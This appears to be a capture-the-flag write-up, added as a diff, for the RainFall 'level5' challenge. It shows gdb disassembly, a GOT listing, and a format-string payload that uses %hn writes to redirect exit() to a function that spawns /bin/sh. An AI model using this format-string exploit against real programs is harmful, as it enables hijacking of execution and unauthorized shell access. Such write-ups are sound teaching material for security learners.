@@ -1,0 +1,88 @@
+# This time instead of overwriting a global variable, we'll need to
+# redirect the flow of execution of the program :
+
+(gdb) disas n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   %ebp
+   0x080484c3 <+1>:	mov    %esp,%ebp
+   0x080484c5 <+3>:	sub    $0x218,%esp
+   0x080484cb <+9>:	mov    0x8049848,%eax
+   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
+   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484dc <+26>:	lea    -0x208(%ebp),%eax <== same buffer as previous levels
+   0x080484e2 <+32>:	mov    %eax,(%esp)
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax <== Sole argument passed to printf
+   0x080484f0 <+46>:	mov    %eax,(%esp)
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt> 
+   0x080484f8 <+54>:	movl   $0x1,(%esp)
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt> <== exit(1)
+End of assembler dump.
+
+# As you can see, the program exits after printf. There is also no call to system()
+# here. By checking the list of defined functions, we see :
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+[...]
+0x080484a4  o
+[...]
+
+(gdb) disas o
+Dump of assembler code for function o:
+	0x080484a4 <+0>:	push   %ebp
+	0x080484a5 <+1>:	mov    %esp,%ebp
+	0x080484a7 <+3>:	sub    $0x18,%esp
+	0x080484aa <+6>:	movl   $0x80485f0,(%esp)
+	0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+	0x080484b6 <+18>:	movl   $0x1,(%esp)
+	0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+End of assembler dump.
+
+(gdb) x/s 0x80485f0
+0x80485f0:	 "/bin/sh"
+
+# The idea here would be to overwrite the address of exit with the address of o,
+# in the Global Offset Table :
+
+level5@RainFall:~$ objdump -R level5
+
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+==> 08049838 <== R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+
+# Let's find the position of the buffer relative to $esp :
+
+(gdb) b *0x080484f3
+Breakpoint 1 at 0x80484f3
+(gdb) r < <(python -c "print 'A'*4")
+Starting program: /home/user/level5/level5 < <(python -c "print 'A'*4")
+
+Breakpoint 1, 0x080484f3 in n ()
+(gdb) x/8wx $esp
+0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+0xbffff4f0:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
+
+# The buffer is at $esp + 4 (words), once in the stack frame of printf.
+# Finally, the payload is as follows :
+
+level5@RainFall:~$ python -c "import struct;
+> thi = struct.pack('I', 0x804983a)
+> tlow = struct.pack('I', 0x8049838)
+> print thi + tlow + '%2044x' + '%4\$hn' + '%31904x' + '%5\$hn'" > /tmp/xd
+level5@RainFall:~$ cat /tmp/xd - | ./level5
+...
+whoami
+level6
